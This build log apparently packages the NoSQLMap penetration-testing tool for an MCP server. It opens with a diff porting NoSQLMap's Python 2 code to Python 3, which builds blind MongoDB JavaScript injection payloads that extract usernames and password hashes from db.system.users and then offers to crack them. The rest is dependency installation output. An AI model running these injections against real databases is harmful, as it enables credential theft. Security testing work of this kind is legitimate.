+#8 6.524                      usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.user.length == " + str(usrChars) + ") { return true; } var dum='a" + "&")
+#8 6.524  
+#8 6.524 -                    req = urllib2.Request(usrUri, None, requestHeaders)
+#8 6.524 +                    req = urllib.request.Request(usrUri, None, requestHeaders)
+#8 6.524                      lenUri = int(len(getResponseBodyHandlingErrors(req)))
+#8 6.524  
+#8 6.524                      if lenUri == baseLen:
+#8 6.524 @@ -1115,7 +1115,7 @@
+#8 6.524                  while  rightCharsUsr < usrChars:
+#8 6.524                      usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.user.charAt(" + str(rightCharsUsr) + ") == '"+ chars[charCounterUsr] + "') { return true; } var dum='a" + "&")
+#8 6.524  
+#8 6.524 -                    req = urllib2.Request(usrUri, None, requestHeaders)
+#8 6.524 +                    req = urllib.request.Request(usrUri, None, requestHeaders)
+#8 6.524                      lenUri = int(len(getResponseBodyHandlingErrors(req)))
+#8 6.524  
+#8 6.524                      if lenUri == baseLen:
+#8 6.524 @@ -1140,7 +1140,7 @@
+#8 6.524                  while rightCharsHash < 32:  #Hash length is static
+#8 6.524                      hashUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.pwd.charAt(" + str(rightCharsHash) + ") == '"+ chars[charCounterHash] + "') { return true; } var dum='a" + "&")
+#8 6.524  
+#8 6.524 -                    req = urllib2.Request(hashUri, None, requestHeaders)
+#8 6.524 +                    req = urllib.request.Request(hashUri, None, requestHeaders)
+#8 6.524                      lenUri = int(len(getResponseBodyHandlingErrors(req)))
+#8 6.524  
+#8 6.524                      if lenUri == baseLen:
+#8 6.524 @@ -1153,7 +1153,7 @@
+#8 6.524                          charCounterHash += 1
+#8 6.524  
+#8 6.524                  hashes.append(pwdHash)
+#8 6.524 -                print "Got user:hash " + users[0] + ":" + hashes[0]
+#8 6.524 +                print("Got user:hash " + users[0] + ":" + hashes[0])
+#8 6.524                  # reinitialize all variables and get ready to do it again
+#8 6.524                  charCounterHash = 0
+#8 6.524                  rightCharsHash = 0
+#8 6.524 @@ -1163,7 +1163,7 @@
+#8 6.524                      # different query to get the first user vs. others
+#8 6.524                      usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne({user:{$nin:" + str(users) + "}}); if (usr.user.length == " + str(usrChars) + ") { return true; } var dum='a" + "&")
+#8 6.524  
+#8 6.524 -                    req = urllib2.Request(usrUri, None, requestHeaders)
+#8 6.524 +                    req = urllib.request.Request(usrUri, None, requestHeaders)
+#8 6.524                      lenUri = int(len(getResponseBodyHandlingErrors(req)))
+#8 6.524  
+#8 6.524                      if lenUri == baseLen:
+#8 6.524 @@ -1176,7 +1176,7 @@
+#8 6.524                  while  rightCharsUsr < usrChars:
+#8 6.524                      usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne({user:{$nin:" + str(users) + "}}); if (usr.user.charAt(" + str(rightCharsUsr) + ") == '"+ chars[charCounterUsr] + "') { return true; } var dum='a" + "&")
+#8 6.524  
+#8 6.524 -                    req = urllib2.Request(usrUri, None, requestHeaders)
+#8 6.524 +                    req = urllib.request.Request(usrUri, None, requestHeaders)
+#8 6.524                      lenUri = int(len(getResponseBodyHandlingErrors(req)))
+#8 6.524  
+#8 6.524                      if lenUri == baseLen:
+#8 6.524 @@ -1198,7 +1198,7 @@
+#8 6.524                  while rightCharsHash < 32:  #Hash length is static
+#8 6.524                      hashUri = uriArray[16].replace("---","var usr = db.system.users.findOne({user:{$nin:" + str(users) + "}}); if (usr.pwd.charAt(" + str(rightCharsHash) + ") == '"+ chars[charCounterHash] + "') { return true; } vardum='a" + "&")
+#8 6.524  
+#8 6.524 -                    req = urllib2.Request(hashUri, None, requestHeaders)
+#8 6.524 +                    req = urllib.request.Request(hashUri, None, requestHeaders)
+#8 6.524                      lenUri = int(len(getResponseBodyHandlingErrors(req)))
+#8 6.524  
+#8 6.524                      if lenUri == baseLen:
+#8 6.524 @@ -1211,23 +1211,23 @@
+#8 6.524  
+#8 6.524                  users.append(username)
+#8 6.524                  hashes.append(pwdHash)
+#8 6.524 -                print "Got user:hash " + users[retrUsers-1] + ":" + hashes[retrUsers-1]
+#8 6.524 +                print("Got user:hash " + users[retrUsers-1] + ":" + hashes[retrUsers-1])
+#8 6.524                  # reinitialize all variables and get ready to do it again
+#8 6.524                  username = ""
+#8 6.524                  charCounterHash = 0
+#8 6.524                  rightCharsHash = 0
+#8 6.524                  pwdHash = ""
+#8 6.524 -    crackHash = raw_input("Crack recovered hashes (y/n)?:  ")
+#8 6.524 +    crackHash = input("Crack recovered hashes (y/n)?:  ")
+#8 6.524  
+#8 6.524      while crackHash.lower() == "y":
+#8 6.524          menuItem = 1
+#8 6.524          for user in users:
+#8 6.524 -            print str(menuItem) + "-" + user
+#8 6.524 +            print(str(menuItem) + "-" + user)
+#8 6.524              menuItem +=1
+#8 6.524  
+#8 6.524 -        userIndex = raw_input("Select user hash to crack: ")
+#8 6.524 +        userIndex = input("Select user hash to crack: ")
+#8 6.524          nsmmongo.passCrack(users[int(userIndex)-1],hashes[int(userIndex)-1])
+#8 6.524  
+#8 6.524 -        crackHash = raw_input("Crack another hash (y/n)?")
+#8 6.524 -    raw_input("Press enter to continue...")
+#8 6.524 +        crackHash = input("Crack another hash (y/n)?")
+#8 6.526 +    input("Press enter to continue...")
+#8 6.526      return
+#8 7.687 Collecting pymongo<5.0,>=3.7
+#8 7.739   Downloading pymongo-4.16.0-cp312-cp312-manylinux2014_aarch64.manylinux_2_17_aarch64.manylinux_2_28_aarch64.whl.metadata (10.0 kB)
+#8 7.755 Collecting httplib2>=0.19.0
+#8 7.762   Downloading httplib2-0.31.2-py3-none-any.whl.metadata (2.2 kB)
+#8 7.985 Collecting ipcalc>=1.1.3
+#8 8.202   Downloading ipcalc-1.99.0.tar.gz (9.8 kB)
+#8 8.211   Installing build dependencies: started
+#8 8.973   Installing build dependencies: finished with status 'done'
+#8 8.973   Getting requirements to build wheel: started
+#8 9.059   Getting requirements to build wheel: finished with status 'done'
+#8 9.060   Preparing metadata (pyproject.toml): started
+#8 9.135   Preparing metadata (pyproject.toml): finished with status 'done'
+#8 9.346 Collecting pbkdf2>=1.3
+#8 9.563   Downloading pbkdf2-1.3.tar.gz (6.4 kB)
+#8 9.570   Installing build dependencies: started
+#8 10.19   Installing build dependencies: finished with status 'done'
+#8 10.19   Getting requirements to build wheel: started
+#8 10.26   Getting requirements to build wheel: finished with status 'done'
+#8 10.26   Preparing metadata (pyproject.toml): started
+#8 10.34   Preparing metadata (pyproject.toml): finished with status 'done'
+#8 10.35 Collecting requests
+#8 10.36   Downloading requests-2.32.5-py3-none-any.whl.metadata (4.9 kB)
+#8 10.58 Collecting CouchDB>=1.1
+#8 10.79   Downloading CouchDB-1.2-py2.py3-none-any.whl.metadata (930 bytes)
+#8 10.81 Collecting six
+#8 10.82   Downloading six-1.17.0-py2.py3-none-any.whl.metadata (1.7 kB)
+#8 10.84 Collecting dnspython<3.0.0,>=2.6.1 (from pymongo<5.0,>=3.7)
+#8 10.85   Downloading dnspython-2.8.0-py3-none-any.whl.metadata (5.7 kB)
+#8 10.88 Collecting pyparsing<4,>=3.1 (from httplib2>=0.19.0)
+#8 10.88   Downloading pyparsing-3.3.2-py3-none-any.whl.metadata (5.8 kB)
+#8 10.95 Collecting charset_normalizer<4,>=2 (from requests)
+#8 10.96   Downloading charset_normalizer-3.4.6-cp312-cp312-manylinux2014_aarch64.manylinux_2_17_aarch64.manylinux_2_28_aarch64.whl.metadata (40 kB)
+#8 10.97 Collecting idna<4,>=2.5 (from requests)
+#8 10.98   Downloading idna-3.11-py3-none-any.whl.metadata (8.4 kB)
+#8 11.00 Collecting urllib3<3,>=1.21.1 (from requests)
+#8 11.01   Downloading urllib3-2.6.3-py3-none-any.whl.metadata (6.9 kB)
+#8 11.03 Collecting certifi>=2017.4.17 (from requests)
+#8 11.03   Downloading certifi-2026.2.25-py3-none-any.whl.metadata (2.5 kB)
+#8 11.04 Downloading pymongo-4.16.0-cp312-cp312-manylinux2014_aarch64.manylinux_2_17_aarch64.manylinux_2_28_aarch64.whl (1.7 MB)
+#8 11.08    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.7/1.7 MB 62.6 MB/s eta 0:00:00
+#8 11.09 Downloading httplib2-0.31.2-py3-none-any.whl (91 kB)
+#8 11.10 Downloading requests-2.32.5-py3-none-any.whl (64 kB)
+#8 11.32 Downloading CouchDB-1.2-py2.py3-none-any.whl (67 kB)
+#8 11.33 Downloading six-1.17.0-py2.py3-none-any.whl (11 kB)
+#8 11.34 Downloading certifi-2026.2.25-py3-none-any.whl (153 kB)
+#8 11.35 Downloading charset_normalizer-3.4.6-cp312-cp312-manylinux2014_aarch64.manylinux_2_17_aarch64.manylinux_2_28_aarch64.whl (199 kB)
+#8 11.36 Downloading dnspython-2.8.0-py3-none-any.whl (331 kB)
+#8 11.37 Downloading idna-3.11-py3-none-any.whl (71 kB)
+#8 11.38 Downloading pyparsing-3.3.2-py3-none-any.whl (122 kB)
+#8 11.39 Downloading urllib3-2.6.3-py3-none-any.whl (131 kB)
+#8 11.41 Building wheels for collected packages: ipcalc, pbkdf2
+#8 11.41   Building wheel for ipcalc (pyproject.toml): started
+#8 11.51   Building wheel for ipcalc (pyproject.toml): finished with status 'done'
+#8 11.51   Created wheel for ipcalc: filename=ipcalc-1.99.0-py3-none-any.whl size=9331 sha256=8422d3ab78ef8184e17fd09c8f031c2d1aef141db3f3f737239d0928c7a4de89
+#8 11.51   Stored in directory: /tmp/pip-ephem-wheel-cache-8cu98dl0/wheels/79/07/82/bdd7b175f718cbc7204e2940ce9853b195138f9efd8b2fe9ee
+#8 11.51   Building wheel for pbkdf2 (pyproject.toml): started
+#8 11.59   Building wheel for pbkdf2 (pyproject.toml): finished with status 'done'
+#8 11.59   Created wheel for pbkdf2: filename=pbkdf2-1.3-py3-none-any.whl size=5122 sha256=207d74d6f0b3303704d4b2ee0c16a89b25568c593da1162ce4c0dea8e9052065
+#8 11.59   Stored in directory: /tmp/pip-ephem-wheel-cache-8cu98dl0/wheels/68/bb/7d/ac2622f4673fb924423f8e15401578c61ad3bbb58f0fde55ba
+#8 11.59 Successfully built ipcalc pbkdf2
+#8 11.60 Installing collected packages: pbkdf2, ipcalc, CouchDB, urllib3, six, pyparsing, idna, dnspython, charset_normalizer, certifi, requests, pymongo, httplib2
+#8 12.12 Successfully installed CouchDB-1.2 certifi-2026.2.25 charset_normalizer-3.4.6 dnspython-2.8.0 httplib2-0.31.2 idna-3.11 ipcalc-1.99.0 pbkdf2-1.3 pymongo-4.16.0 pyparsing-3.3.2 requests-2.32.5 six-1.17.0 urllib3-2.6.3
+#8 12.12 WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager, possibly rendering your system unusable. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv. Use the --root-user-action option if you know what you are doing and want to suppress this warning.
+#8 12.20 
+#8 12.20 [notice] A new release of pip is available: 25.0.1 -> 26.0.1
+#8 12.20 [notice] To update, run: pip install --upgrade pip
+#8 DONE 12.3s
+
+#9 [ 4/10] COPY <<WRAPPER /usr/local/bin/nosqlmap
+#9 DONE 0.0s
+
+#10 [ 5/10] RUN chmod +x /usr/local/bin/nosqlmap
+#10 DONE 0.2s
+
+#11 [ 6/10] WORKDIR /app
+#11 DONE 0.0s
+
+#12 [ 7/10] COPY requirements.txt ./
+#12 DONE 0.0s
+
+#13 [ 8/10] RUN pip install --no-cache-dir -r requirements.txt
+#13 0.376 Collecting fastmcp>=2.0.0 (from -r requirements.txt (line 1))
+#13 0.423   Downloading fastmcp-3.1.1-py3-none-any.whl.metadata (8.1 kB)
+#13 0.440 Collecting authlib>=1.6.5 (from fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 0.447   Downloading authlib-1.6.9-py2.py3-none-any.whl.metadata (9.8 kB)
+#13 0.471 Collecting cyclopts>=4.0.0 (from fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 0.477   Downloading cyclopts-4.10.0-py3-none-any.whl.metadata (12 kB)
+#13 0.492 Collecting exceptiongroup>=1.2.2 (from fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 0.499   Downloading exceptiongroup-1.3.1-py3-none-any.whl.metadata (6.7 kB)
+#13 0.517 Collecting httpx<1.0,>=0.28.1 (from fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 0.525   Downloading httpx-0.28.1-py3-none-any.whl.metadata (7.1 kB)
+#13 0.535 Collecting jsonref>=1.1.0 (from fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 0.541   Downloading jsonref-1.1.0-py3-none-any.whl.metadata (2.7 kB)
+#13 0.553 Collecting jsonschema-path>=0.3.4 (from fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 0.562   Downloading jsonschema_path-0.4.5-py3-none-any.whl.metadata (5.9 kB)
+#13 0.574 Collecting mcp<2.0,>=1.24.0 (from fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 0.584   Downloading mcp-1.26.0-py3-none-any.whl.metadata (89 kB)
+#13 0.607 Collecting openapi-pydantic>=0.5.1 (from fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 0.615   Downloading openapi_pydantic-0.5.1-py3-none-any.whl.metadata (10 kB)
+#13 0.629 Collecting opentelemetry-api>=1.20.0 (from fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 0.635   Downloading opentelemetry_api-1.40.0-py3-none-any.whl.metadata (1.5 kB)
+#13 0.649 Collecting packaging>=24.0 (from fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 0.656   Downloading packaging-26.0-py3-none-any.whl.metadata (3.3 kB)
+#13 0.669 Collecting platformdirs>=4.0.0 (from fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 0.677   Downloading platformdirs-4.9.4-py3-none-any.whl.metadata (4.7 kB)
+#13 0.688 Collecting py-key-value-aio<0.5.0,>=0.4.4 (from py-key-value-aio[filetree,keyring,memory]<0.5.0,>=0.4.4->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 0.695   Downloading py_key_value_aio-0.4.4-py3-none-any.whl.metadata (15 kB)
+#13 0.773 Collecting pydantic>=2.11.7 (from pydantic[email]>=2.11.7->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 0.781   Downloading pydantic-2.12.5-py3-none-any.whl.metadata (90 kB)
+#13 0.795 Collecting pyperclip>=1.9.0 (from fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 0.801   Downloading pyperclip-1.11.0-py3-none-any.whl.metadata (2.4 kB)
+#13 0.812 Collecting python-dotenv>=1.1.0 (from fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 0.819   Downloading python_dotenv-1.2.2-py3-none-any.whl.metadata (27 kB)
+#13 0.839 Collecting pyyaml<7.0,>=6.0 (from fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 0.847   Downloading pyyaml-6.0.3-cp312-cp312-manylinux2014_aarch64.manylinux_2_17_aarch64.manylinux_2_28_aarch64.whl.metadata (2.4 kB)
+#13 0.868 Collecting rich>=13.9.4 (from fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 0.876   Downloading rich-14.3.3-py3-none-any.whl.metadata (18 kB)
+#13 0.885 Collecting uncalled-for>=0.2.0 (from fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 0.892   Downloading uncalled_for-0.2.0-py3-none-any.whl.metadata (2.9 kB)
+#13 0.910 Collecting uvicorn>=0.35 (from fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 0.917   Downloading uvicorn-0.42.0-py3-none-any.whl.metadata (6.7 kB)
+#13 0.954 Collecting watchfiles>=1.0.0 (from fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 0.961   Downloading watchfiles-1.1.1-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl.metadata (4.9 kB)
+#13 1.000 Collecting websockets>=15.0.1 (from fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 1.006   Downloading websockets-16.0-cp312-cp312-manylinux2014_aarch64.manylinux_2_17_aarch64.manylinux_2_28_aarch64.whl.metadata (6.8 kB)
+#13 1.082 Collecting cryptography (from authlib>=1.6.5->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 1.088   Downloading cryptography-46.0.5-cp311-abi3-manylinux_2_34_aarch64.whl.metadata (5.7 kB)
+#13 1.101 Collecting attrs>=23.1.0 (from cyclopts>=4.0.0->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 1.108   Downloading attrs-26.1.0-py3-none-any.whl.metadata (8.8 kB)
+#13 1.118 Collecting docstring-parser<4.0,>=0.15 (from cyclopts>=4.0.0->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 1.125   Downloading docstring_parser-0.17.0-py3-none-any.whl.metadata (3.5 kB)
+#13 1.135 Collecting rich-rst<2.0.0,>=1.3.1 (from cyclopts>=4.0.0->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 1.143   Downloading rich_rst-1.3.2-py3-none-any.whl.metadata (6.1 kB)
+#13 1.162 Collecting typing-extensions>=4.6.0 (from exceptiongroup>=1.2.2->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 1.169   Downloading typing_extensions-4.15.0-py3-none-any.whl.metadata (3.3 kB)
+#13 1.183 Collecting anyio (from httpx<1.0,>=0.28.1->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 1.190   Downloading anyio-4.12.1-py3-none-any.whl.metadata (4.3 kB)
+#13 1.191 Requirement already satisfied: certifi in /usr/local/lib/python3.12/site-packages (from httpx<1.0,>=0.28.1->fastmcp>=2.0.0->-r requirements.txt (line 1)) (2026.2.25)
+#13 1.204 Collecting httpcore==1.* (from httpx<1.0,>=0.28.1->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 1.212   Downloading httpcore-1.0.9-py3-none-any.whl.metadata (21 kB)
+#13 1.213 Requirement already satisfied: idna in /usr/local/lib/python3.12/site-packages (from httpx<1.0,>=0.28.1->fastmcp>=2.0.0->-r requirements.txt (line 1)) (3.11)
+#13 1.221 Collecting h11>=0.16 (from httpcore==1.*->httpx<1.0,>=0.28.1->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 1.228   Downloading h11-0.16.0-py3-none-any.whl.metadata (8.3 kB)
+#13 1.240 Collecting pathable<0.6.0,>=0.5.0 (from jsonschema-path>=0.3.4->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 1.247   Downloading pathable-0.5.0-py3-none-any.whl.metadata (5.9 kB)
+#13 1.266 Collecting referencing<0.38.0 (from jsonschema-path>=0.3.4->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 1.273   Downloading referencing-0.37.0-py3-none-any.whl.metadata (2.8 kB)
+#13 1.285 Collecting httpx-sse>=0.4 (from mcp<2.0,>=1.24.0->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 1.292   Downloading httpx_sse-0.4.3-py3-none-any.whl.metadata (9.7 kB)
+#13 1.311 Collecting jsonschema>=4.20.0 (from mcp<2.0,>=1.24.0->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 1.318   Downloading jsonschema-4.26.0-py3-none-any.whl.metadata (7.6 kB)
+#13 1.331 Collecting pydantic-settings>=2.5.2 (from mcp<2.0,>=1.24.0->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 1.337   Downloading pydantic_settings-2.13.1-py3-none-any.whl.metadata (3.4 kB)
+#13 1.356 Collecting pyjwt>=2.10.1 (from pyjwt[crypto]>=2.10.1->mcp<2.0,>=1.24.0->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 1.362   Downloading pyjwt-2.12.1-py3-none-any.whl.metadata (4.1 kB)
+#13 1.374 Collecting python-multipart>=0.0.9 (from mcp<2.0,>=1.24.0->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 1.379   Downloading python_multipart-0.0.22-py3-none-any.whl.metadata (1.8 kB)
+#13 1.393 Collecting sse-starlette>=1.6.1 (from mcp<2.0,>=1.24.0->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 1.400   Downloading sse_starlette-3.3.3-py3-none-any.whl.metadata (14 kB)
+#13 1.435 Collecting starlette>=0.27 (from mcp<2.0,>=1.24.0->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 1.443   Downloading starlette-0.52.1-py3-none-any.whl.metadata (6.3 kB)
+#13 1.455 Collecting typing-inspection>=0.4.1 (from mcp<2.0,>=1.24.0->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 1.463   Downloading typing_inspection-0.4.2-py3-none-any.whl.metadata (2.6 kB)
+#13 1.493 Collecting importlib-metadata<8.8.0,>=6.0 (from opentelemetry-api>=1.20.0->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 1.500   Downloading importlib_metadata-8.7.1-py3-none-any.whl.metadata (4.7 kB)
+#13 1.519 Collecting beartype>=0.20.0 (from py-key-value-aio<0.5.0,>=0.4.4->py-key-value-aio[filetree,keyring,memory]<0.5.0,>=0.4.4->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 1.526   Downloading beartype-0.22.9-py3-none-any.whl.metadata (37 kB)
+#13 1.552 Collecting aiofile>=3.5.0 (from py-key-value-aio[filetree,keyring,memory]<0.5.0,>=0.4.4->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 1.559   Downloading aiofile-3.9.0-py3-none-any.whl.metadata (14 kB)
+#13 1.582 Collecting keyring>=25.6.0 (from py-key-value-aio[filetree,keyring,memory]<0.5.0,>=0.4.4->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 1.589   Downloading keyring-25.7.0-py3-none-any.whl.metadata (21 kB)
+#13 1.604 Collecting cachetools>=5.0.0 (from py-key-value-aio[filetree,keyring,memory]<0.5.0,>=0.4.4->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 1.611   Downloading cachetools-7.0.5-py3-none-any.whl.metadata (5.6 kB)
+#13 1.619 Collecting annotated-types>=0.6.0 (from pydantic>=2.11.7->pydantic[email]>=2.11.7->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 1.628   Downloading annotated_types-0.7.0-py3-none-any.whl.metadata (15 kB)
+#13 1.890 Collecting pydantic-core==2.41.5 (from pydantic>=2.11.7->pydantic[email]>=2.11.7->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 1.898   Downloading pydantic_core-2.41.5-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl.metadata (7.3 kB)
+#13 1.913 Collecting email-validator>=2.0.0 (from pydantic[email]>=2.11.7->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 1.920   Downloading email_validator-2.3.0-py3-none-any.whl.metadata (26 kB)
+#13 1.934 Collecting markdown-it-py>=2.2.0 (from rich>=13.9.4->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 1.941   Downloading markdown_it_py-4.0.0-py3-none-any.whl.metadata (7.3 kB)
+#13 1.957 Collecting pygments<3.0.0,>=2.13.0 (from rich>=13.9.4->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 1.963   Downloading pygments-2.19.2-py3-none-any.whl.metadata (2.5 kB)
+#13 1.977 Collecting click>=7.0 (from uvicorn>=0.35->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 1.984   Downloading click-8.3.1-py3-none-any.whl.metadata (2.6 kB)
+#13 2.011 Collecting caio<0.10.0,>=0.9.0 (from aiofile>=3.5.0->py-key-value-aio[filetree,keyring,memory]<0.5.0,>=0.4.4->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 2.019   Downloading caio-0.9.25-cp312-cp312-manylinux_2_34_aarch64.whl.metadata (3.3 kB)
+#13 2.025 Requirement already satisfied: dnspython>=2.0.0 in /usr/local/lib/python3.12/site-packages (from email-validator>=2.0.0->pydantic[email]>=2.11.7->fastmcp>=2.0.0->-r requirements.txt (line 1)) (2.8.0)
+#13 2.040 Collecting zipp>=3.20 (from importlib-metadata<8.8.0,>=6.0->opentelemetry-api>=1.20.0->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 2.046   Downloading zipp-3.23.0-py3-none-any.whl.metadata (3.6 kB)
+#13 2.059 Collecting jsonschema-specifications>=2023.03.6 (from jsonschema>=4.20.0->mcp<2.0,>=1.24.0->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 2.066   Downloading jsonschema_specifications-2025.9.1-py3-none-any.whl.metadata (2.9 kB)
+#13 2.167 Collecting rpds-py>=0.25.0 (from jsonschema>=4.20.0->mcp<2.0,>=1.24.0->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 2.175   Downloading rpds_py-0.30.0-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl.metadata (4.1 kB)
+#13 2.185 Collecting SecretStorage>=3.2 (from keyring>=25.6.0->py-key-value-aio[filetree,keyring,memory]<0.5.0,>=0.4.4->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 2.196   Downloading secretstorage-3.5.0-py3-none-any.whl.metadata (4.0 kB)
+#13 2.206 Collecting jeepney>=0.4.2 (from keyring>=25.6.0->py-key-value-aio[filetree,keyring,memory]<0.5.0,>=0.4.4->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 2.212   Downloading jeepney-0.9.0-py3-none-any.whl.metadata (1.2 kB)
+#13 2.222 Collecting jaraco.classes (from keyring>=25.6.0->py-key-value-aio[filetree,keyring,memory]<0.5.0,>=0.4.4->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 2.228   Downloading jaraco.classes-3.4.0-py3-none-any.whl.metadata (2.6 kB)
+#13 2.241 Collecting jaraco.functools (from keyring>=25.6.0->py-key-value-aio[filetree,keyring,memory]<0.5.0,>=0.4.4->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 2.249   Downloading jaraco_functools-4.4.0-py3-none-any.whl.metadata (3.0 kB)
+#13 2.260 Collecting jaraco.context (from keyring>=25.6.0->py-key-value-aio[filetree,keyring,memory]<0.5.0,>=0.4.4->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 2.267   Downloading jaraco_context-6.1.1-py3-none-any.whl.metadata (4.3 kB)
+#13 2.278 Collecting mdurl~=0.1 (from markdown-it-py>=2.2.0->rich>=13.9.4->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 2.284   Downloading mdurl-0.1.2-py3-none-any.whl.metadata (1.6 kB)
+#13 2.347 Collecting cffi>=2.0.0 (from cryptography->authlib>=1.6.5->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 2.353   Downloading cffi-2.0.0-cp312-cp312-manylinux2014_aarch64.manylinux_2_17_aarch64.whl.metadata (2.6 kB)
+#13 2.373 Collecting docutils (from rich-rst<2.0.0,>=1.3.1->cyclopts>=4.0.0->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 2.380   Downloading docutils-0.22.4-py3-none-any.whl.metadata (15 kB)
+#13 2.413 Collecting pycparser (from cffi>=2.0.0->cryptography->authlib>=1.6.5->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 2.425   Downloading pycparser-3.0-py3-none-any.whl.metadata (8.2 kB)
+#13 2.459 Collecting more-itertools (from jaraco.classes->keyring>=25.6.0->py-key-value-aio[filetree,keyring,memory]<0.5.0,>=0.4.4->fastmcp>=2.0.0->-r requirements.txt (line 1))
+#13 2.467   Downloading more_itertools-10.8.0-py3-none-any.whl.metadata (39 kB)
+#13 2.479 Downloading fastmcp-3.1.1-py3-none-any.whl (633 kB)
+#13 2.495    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 633.8/633.8 kB 50.4 MB/s eta 0:00:00
+#13 2.504 Downloading authlib-1.6.9-py2.py3-none-any.whl (244 kB)
+#13 2.515 Downloading cyclopts-4.10.0-py3-none-any.whl (204 kB)
+#13 2.525 Downloading exceptiongroup-1.3.1-py3-none-any.whl (16 kB)
+#13 2.532 Downloading httpx-0.28.1-py3-none-any.whl (73 kB)
+#13 2.540 Downloading httpcore-1.0.9-py3-none-any.whl (78 kB)
+#13 2.549 Downloading jsonref-1.1.0-py3-none-any.whl (9.4 kB)
+#13 2.557 Downloading jsonschema_path-0.4.5-py3-none-any.whl (19 kB)
+#13 2.563 Downloading mcp-1.26.0-py3-none-any.whl (233 kB)
+#13 2.574 Downloading openapi_pydantic-0.5.1-py3-none-any.whl (96 kB)
+#13 2.583 Downloading opentelemetry_api-1.40.0-py3-none-any.whl (68 kB)
+#13 2.592 Downloading packaging-26.0-py3-none-any.whl (74 kB)
+#13 2.600 Downloading platformdirs-4.9.4-py3-none-any.whl (21 kB)
+#13 2.609 Downloading py_key_value_aio-0.4.4-py3-none-any.whl (152 kB)
+#13 2.618 Downloading pydantic-2.12.5-py3-none-any.whl (463 kB)
+#13 2.631 Downloading pydantic_core-2.41.5-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl (1.9 MB)
+#13 2.715    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.9/1.9 MB 20.6 MB/s eta 0:00:00
+#13 2.724 Downloading pyperclip-1.11.0-py3-none-any.whl (11 kB)
+#13 2.733 Downloading python_dotenv-1.2.2-py3-none-any.whl (22 kB)
+#13 2.740 Downloading pyyaml-6.0.3-cp312-cp312-manylinux2014_aarch64.manylinux_2_17_aarch64.manylinux_2_28_aarch64.whl (775 kB)
+#13 2.779    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 775.1/775.1 kB 16.0 MB/s eta 0:00:00
